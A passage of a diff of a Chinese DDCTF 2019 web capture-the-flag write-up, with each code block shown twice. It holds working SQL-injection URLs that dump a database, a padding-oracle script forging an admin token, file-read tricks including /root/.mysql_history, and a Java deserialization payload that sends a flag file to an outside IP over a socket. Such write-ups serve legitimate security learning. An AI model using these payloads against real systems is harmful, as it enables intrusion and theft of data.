+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getOneTicket</span>(i):
+    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+    np <span style="color:#f92672">=</span> basename<span style="color:#f92672">+</span>str(i)
+    register(s, {<span style="color:#e6db74">&#39;name&#39;</span>: np, <span style="color:#e6db74">&#39;password&#39;</span>: np})
+    login(s, {<span style="color:#e6db74">&#39;name&#39;</span>: np, <span style="color:#e6db74">&#39;password&#39;</span>: np})
+    bill_id <span style="color:#f92672">=</span> buy_ticket(s)
+    <span style="color:#66d9ef">return</span> pay_ticket(s, bill_id)
 
-def getOneTicket(i):
-    s = requests.Session()
-    np = basename+str(i)
-    register(s, {'name': np, 'password': np})
-    login(s, {'name': np, 'password': np})
-    bill_id = buy_ticket(s)
-    return pay_ticket(s, bill_id)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getMain</span>():
+    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+    np <span style="color:#f92672">=</span> basename<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;flag&#39;</span>
+    <span style="color:#75715e">#register(s, {&#39;name&#39;: np, &#39;password&#39;: np})</span>
+    login(s, {<span style="color:#e6db74">&#39;name&#39;</span>: np, <span style="color:#e6db74">&#39;password&#39;</span>: np})
+    <span style="color:#75715e">#bill_id = buy_ticket(s)</span>
+    <span style="color:#75715e">#pay_ticket(s, bill_id)</span>
+    <span style="color:#66d9ef">return</span> s
 
-def getMain():
-    s = requests.Session()
-    np = basename+'flag'
-    #register(s, {'name': np, 'password': np})
-    login(s, {'name': np, 'password': np})
-    #bill_id = buy_ticket(s)
-    #pay_ticket(s, bill_id)
-    return s
-
-def main():
-    robots = []
-    s = getMain()
-    for i in range(750, 800):
-        robot = getOneTicket(i)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    robots <span style="color:#f92672">=</span> []
+    s <span style="color:#f92672">=</span> getMain()
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">750</span>, <span style="color:#ae81ff">800</span>):
+        robot <span style="color:#f92672">=</span> getOneTicket(i)
         remove_robot(s, robot)
-        print(robot)
-    flag = s.get(baseUrl+'get_flag').text
-    print(flag)
+        <span style="color:#66d9ef">print</span>(robot)
+    flag <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;get_flag&#39;</span>)<span style="color:#f92672">.</span>text
+    <span style="color:#66d9ef">print</span>(flag)
 
-if __name__ == &quot;__main__&quot;:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
     main()
-</code></pre>
-
-<h2 id="欢迎报名ddctf">欢迎报名DDCTF</h2>
-
+</code></pre></div><h2 id="欢迎报名ddctf">欢迎报名DDCTF</h2>
 <p>以为是个注入，没想到是个 xss + 注入 (lll￢ω￢)，赛后看别人 writeup 做的</p>
-
 <p>xss 读取源码，发现接口 <code>query_aIeMu0FUoVrW0NWPHbN6z4xh.php</code>：</p>
-
-<pre><code class="language-html">&lt;!DOCTYPE_html&gt;
-&lt;html_lang=&quot;en&quot;&gt;
-    &lt;head&gt; 
-        &lt;meta_charset=&quot;UTF-8&quot;&gt;
-        &lt;!--每隔30秒自动刷新--&gt;
-        &lt;meta_http-equiv=&quot;refresh&quot;_content=&quot;30&quot;&gt;
-        &lt;title&gt;DDCTF报名列表&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;table__align=&quot;center&quot;_&gt;
-            &lt;thead&gt;
-                &lt;tr&gt;
-                    &lt;th&gt;姓名&lt;/th&gt; 
-                    &lt;th&gt;昵称&lt;/th&gt;
-                    &lt;th&gt;备注&lt;/th&gt;
-                    &lt;th&gt;时间&lt;/th&gt;
-                &lt;/tr&gt;
-            &lt;/thead&gt;
-            &lt;tbody&gt;
-                &lt;!--_列表循环展示_--&gt;
-                &lt;tr&gt;
-                    &lt;td&gt;&lt;a_target=&quot;_blank&quot;__href=&quot;index_php&quot;&gt;报名&lt;/a&gt;&lt;/td&gt;
-                &lt;/tr&gt;
-                &lt;!--_&lt;a_target=&quot;_blank&quot;__href=&quot;query_aIeMu0FUoVrW0NWPHbN6z4xh_php&quot;&gt;_接口_&lt;/a&gt;--&gt;
-            &lt;/tbody&gt;
-        &lt;/table&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<p>注入：</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE_html&gt;</span>
+&lt;<span style="color:#f92672">html_lang</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">en</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;
+    &lt;<span style="color:#f92672">head</span>&gt; 
+        &lt;<span style="color:#f92672">meta_charset</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">UTF-8</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;
+        <span style="color:#75715e">&lt;!--每隔30秒自动刷新--&gt;</span>
+        &lt;<span style="color:#f92672">meta_http-equiv</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">refresh</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">_content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;30&#34;</span>&gt;
+        &lt;<span style="color:#f92672">title</span>&gt;DDCTF报名列表&lt;/<span style="color:#f92672">title</span>&gt;
+    &lt;/<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">body</span>&gt;
+        &lt;<span style="color:#f92672">table__align</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">center</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">_</span>&gt;
+            &lt;<span style="color:#f92672">thead</span>&gt;
+                &lt;<span style="color:#f92672">tr</span>&gt;
+                    &lt;<span style="color:#f92672">th</span>&gt;姓名&lt;/<span style="color:#f92672">th</span>&gt; 
+                    &lt;<span style="color:#f92672">th</span>&gt;昵称&lt;/<span style="color:#f92672">th</span>&gt;
+                    &lt;<span style="color:#f92672">th</span>&gt;备注&lt;/<span style="color:#f92672">th</span>&gt;
+                    &lt;<span style="color:#f92672">th</span>&gt;时间&lt;/<span style="color:#f92672">th</span>&gt;
+                &lt;/<span style="color:#f92672">tr</span>&gt;
+            &lt;/<span style="color:#f92672">thead</span>&gt;
+            &lt;<span style="color:#f92672">tbody</span>&gt;
+                <span style="color:#75715e">&lt;!--_列表循环展示_--&gt;</span>
+                &lt;<span style="color:#f92672">tr</span>&gt;
+                    &lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">a_target</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">_blank</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">__href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index_php&#34;</span>&gt;报名&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;
+                &lt;/<span style="color:#f92672">tr</span>&gt;
+                <span style="color:#75715e">&lt;!--_&lt;a_target=&#34;_blank&#34;__href=&#34;query_aIeMu0FUoVrW0NWPHbN6z4xh_php&#34;&gt;_接口_&lt;/a&gt;--&gt;</span>
+            &lt;/<span style="color:#f92672">tbody</span>&gt;
+        &lt;/<span style="color:#f92672">table</span>&gt;
+    &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>注入：</p>
 <pre><code># database: ctfdb
 http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27or%201%20union%20select%201,group_concat(schema_name),3,4,5%20from%20information_schema.schemata%23
 # table: ctf_fhmHRPL5
@@ -425,115 +399,88 @@ http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%
 http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+GROUP_CONCAT(column_name),2,3,4+FROM+information_schema.columns+WHERE+table_name=0x6374665f66686d4852504c35;%23
 # flag: DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}
 http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+ctf_value,2,3,4+FROM+ctfdb.ctf_fhmHRPL5;%23
-</code></pre>
-
-<h2 id="mysql弱口令">mysql弱口令</h2>
-
-<p>主要考点就是通过 MySQL LOAD DATA 的特性进行任意文件的读取，直接部署 <a href="https://github.com/allyshka/Rogue-MySql-Server" rel="nofollow noreferrer" target="_blank">https://github.com/allyshka/Rogue-MySql-Server</a> 上的脚本进行文件读取即可。</p>
-
+</code></pre><h2 id="mysql弱口令">mysql弱口令</h2>
+<p>主要考点就是通过 MySQL LOAD DATA 的特性进行任意文件的读取，直接部署 <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a> 上的脚本进行文件读取即可。</p>
 <p>正常的思路是：<code>读取源码</code> =&gt; <code>读取数据库信息</code> =&gt; <code>读取数据库文件</code> =&gt; <code>获得 flag</code>，可以发现 flag 在 <code>/var/lib/mysql/security/flag.ibd</code> 文件中。</p>
-
 <p>还有一种思路则是直接读取 <code>/root/.mysql_history</code>，由于 mysql 进行操作的时候会将 log 写入相应的记录文件中，所以可以直接从 log 文件中读取相应的 flag。</p>
-
 <h2 id="再来1杯java">再来1杯Java</h2>
-
 <p>愉快的学习 java web 之路。。</p>
-
 <p>padding oracle：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> binascii
 
-<pre><code class="language-python">import requests
-import base64
-import binascii
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token&#34;</span>
+base_token <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF&#34;</span>)
+result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 
-url = &quot;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token&quot;
-base_token = base64.b64decode(&quot;UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF&quot;)
-result = ''
-
-for index in range(2):
-    encrypt = base_token[16*(index+1):16*(index+2)]
-    prev = base_token[:16*index]
-    c_iv = base_token[16*index:16*(index+1)]
-    mid_value = 0
-    for i in range(1, 17):
-        for j in range(256):
-            if mid_value:
-                padding =  hex(mid_value ^ int(binascii.hexlify(chr(i)*(i-1)), 16)).strip('L')[2::]
-                if len(padding) % 2:
-                    padding = '0'+padding 
-                token = '{}{}{}{}{}'.format(prev, chr(0)*(16-i), chr(j), binascii.unhexlify(padding), encrypt)
-            else:
-                token = '{}{}{}{}'.format(prev, chr(0)*(16-i), chr(j), encrypt)
+<span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+    encrypt <span style="color:#f92672">=</span> base_token[<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span>(index<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span>(index<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)]
+    prev <span style="color:#f92672">=</span> base_token[:<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span>index]
+    c_iv <span style="color:#f92672">=</span> base_token[<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span>index:<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span>(index<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)]
+    mid_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">17</span>):
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+            <span style="color:#66d9ef">if</span> mid_value:
+                padding <span style="color:#f92672">=</span>  hex(mid_value <span style="color:#f92672">^</span> int(binascii<span style="color:#f92672">.</span>hexlify(chr(i)<span style="color:#f92672">*</span>(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)), <span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;L&#39;</span>)[<span style="color:#ae81ff">2</span>::]
+                <span style="color:#66d9ef">if</span> len(padding) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>:
+                    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span>padding 
+                token <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{}{}{}{}{}&#39;</span><span style="color:#f92672">.</span>format(prev, chr(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>i), chr(j), binascii<span style="color:#f92672">.</span>unhexlify(padding), encrypt)
+            <span style="color:#66d9ef">else</span>:
+                token <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{}{}{}{}&#39;</span><span style="color:#f92672">.</span>format(prev, chr(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>i), chr(j), encrypt)
             
-            headers = {
-                'Cookie': &quot;token=&quot;+base64.b64encode(token)
+            headers <span style="color:#f92672">=</span> {
+                <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#34;token=&#34;</span><span style="color:#f92672">+</span>base64<span style="color:#f92672">.</span>b64encode(token)
             }
-            response = requests.get(url, headers=headers)
-            if response.text.strip() != &quot;decrypt err~&quot;:
-                mid_value += ((i ^ j) &lt;&lt; (8*(i-1)))
-                print(hex(mid_value))
-                break
+            response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, headers<span style="color:#f92672">=</span>headers)
+            <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;decrypt err~&#34;</span>:
+                mid_value <span style="color:#f92672">+=</span> ((i <span style="color:#f92672">^</span> j) <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))
+                <span style="color:#66d9ef">print</span>(hex(mid_value))
+                <span style="color:#66d9ef">break</span>
     
-    mid_value = hex(mid_value).strip('L')[2::]
-    if len(mid_value) % 2:
-        mid_value = '0' + mid_value
+    mid_value <span style="color:#f92672">=</span> hex(mid_value)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;L&#39;</span>)[<span style="color:#ae81ff">2</span>::]
+    <span style="color:#66d9ef">if</span> len(mid_value) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>:
+        mid_value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> mid_value
 
-    result += ''.join([chr(ord(x)^ord(y)) for x, y in zip(c_iv, binascii.unhexlify(mid_value))])
-    print(result)
+    result <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([chr(ord(x)<span style="color:#f92672">^</span>ord(y)) <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(c_iv, binascii<span style="color:#f92672">.</span>unhexlify(mid_value))])
+    <span style="color:#66d9ef">print</span>(result)
 
-print(result)
-</code></pre>
-
-<p>最后得到明文： <code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:false}\x04\x04\x04\x04</code></p>
-
+<span style="color:#66d9ef">print</span>(result)
+</code></pre></div><p>最后得到明文： <code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:false}\x04\x04\x04\x04</code></p>
 <p>很明显需要因此构造出： <code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:true}\x06\x05\x05\x05\x05</code>，此时的需要构造如下 iv（懒得算了，参考他人 writeup）：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">c1t<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;c3beeee4265cb3792c43365bd63a5516&#39;</span>  <span style="color:#75715e"># iv2</span>
+<span style="color:#ae81ff">0x00df71d27118c10e13141c66fc84619b</span>  <span style="color:#75715e"># mid</span>
+ivt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;7bfd18b65322f03e23383e1493e804da&#39;</span>  <span style="color:#75715e"># iv</span>
 
-<pre><code class="language-python">c1t='c3beeee4265cb3792c43365bd63a5516'  # iv2
-0x00df71d27118c10e13141c66fc84619b  # mid
-ivt='7bfd18b65322f03e23383e1493e804da'  # iv
-
-print base64.b64encode(ivt.decode('hex')+c1t.decode('hex')+base_token[32:48])
-</code></pre>
-
-<p>登录成功后由 <code>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt</code> 获得 hint:</p>
-
+<span style="color:#66d9ef">print</span> base64<span style="color:#f92672">.</span>b64encode(ivt<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)<span style="color:#f92672">+</span>c1t<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)<span style="color:#f92672">+</span>base_token[<span style="color:#ae81ff">32</span>:<span style="color:#ae81ff">48</span>])
+</code></pre></div><p>登录成功后由 <code>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt</code> 获得 hint:</p>
 <pre><code>Try to hack~ 
 Hint:
 1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ 
 2. You can not exec commands~ 
-</code></pre>
-
-<p>很明显此处有一个任意文件读的问题存在，但受到了很明显的限制，经过尝试后发现在 <code>/proc/self/fd/15</code> 可以获得源码。</p>
-
+</code></pre><p>很明显此处有一个任意文件读的问题存在，但受到了很明显的限制，经过尝试后发现在 <code>/proc/self/fd/15</code> 可以获得源码。</p>
 <p>之后就是源码审计 + 利用 JRMP 反序列化漏洞，相关的利用点在</p>
-
 <p><code>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/nicaibudao_hahaxxxx/deserial?base64Info=</code> 接口处</p>
-
-<p>详情参考 <a href="https://xz.aliyun.com/t/4862#toc-7" rel="nofollow noreferrer" target="_blank">2019-DDCTF-WEB-WriteUp - 再来一篇 java</a>，本人最后执行的 payload 如下：</p>
-
-<pre><code class="language-Java">java.net.Socket s = new java.net.Socket(&quot;39.108.230.53&quot;,8768);
-java.io.File file = new java.io.File(&quot;/flag/flag_7ArPnpf3XW8Npsmj&quot;);
-java.io.InputStream in = new java.io.FileInputStream(file);
-int tempbyte;
-while ((tempbyte = in.read()) != -1) {
-  java.io.OutputStream out = s.getOutputStream();
-  out.write(tempbyte);
-}
-in.close();
-s.close();
-</code></pre>
-
-<p>最后在反弹出的 shell 里接到 flag:</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DDCTF2019-Web/DDCTF2019-Web-Java.png" alt="Flag" class="lazyload"><figcaption class="image-caption">Flag</figcaption></figure></p>
-
+<p>详情参考 <a href="https://xz.aliyun.com/t/4862#toc-7">2019-DDCTF-WEB-WriteUp - 再来一篇 java</a>，本人最后执行的 payload 如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Java" data-lang="Java">java<span style="color:#f92672">.</span><span style="color:#a6e22e">net</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Socket</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">net</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Socket</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;39.108.230.53&#34;</span><span style="color:#f92672">,</span>8768<span style="color:#f92672">);</span>
+java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">File</span> file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">File</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/flag/flag_7ArPnpf3XW8Npsmj&#34;</span><span style="color:#f92672">);</span>
+java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">InputStream</span> in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">FileInputStream</span><span style="color:#f92672">(</span>file<span style="color:#f92672">);</span>
+<span style="color:#66d9ef">int</span> tempbyte<span style="color:#f92672">;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>tempbyte <span style="color:#f92672">=</span> in<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+  java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">OutputStream</span> out <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span>
+  out<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>tempbyte<span style="color:#f92672">);</span>
+<span style="color:#f92672">}</span>
+in<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+s<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</code></pre></div><p>最后在反弹出的 shell 里接到 flag:</p>
+<p><img src="/images/posts/DDCTF2019-Web/DDCTF2019-Web-Java.png" alt="Flag"></p>
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><a href="https://xz.aliyun.com/t/3973" rel="nofollow noreferrer" target="_blank">通过MySQL LOAD DATA特性来达到任意文件读取</a></li>
-<li><a href="https://xz.aliyun.com/t/4862" rel="nofollow noreferrer" target="_blank">2019-DDCTF-WEB-WriteUp</a></li>
-<li><a href="https://www.zhaoj.in/read-5269.html" rel="nofollow noreferrer" target="_blank">DDCTF 2019 Web 部分 WriteUp</a></li>
-<li><a href="https://www.xmsec.cc/ddctf-2019-writeup/" rel="nofollow noreferrer" target="_blank">DDCTF 2019 partial writeup</a></li>
-<li><a href="https://xz.aliyun.com/t/2479" rel="nofollow noreferrer" target="_blank">Weblogic JRMP反序列化漏洞回顾</a></li>
+<li><a href="https://xz.aliyun.com/t/3973">通过MySQL LOAD DATA特性来达到任意文件读取</a></li>
+<li><a href="https://xz.aliyun.com/t/4862">2019-DDCTF-WEB-WriteUp</a></li>
+<li><a href="https://www.zhaoj.in/read-5269.html">DDCTF 2019 Web 部分 WriteUp</a></li>
+<li><a href="https://www.xmsec.cc/ddctf-2019-writeup/">DDCTF 2019 partial writeup</a></li>
+<li><a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></li>
 </ul>
 
     </div>
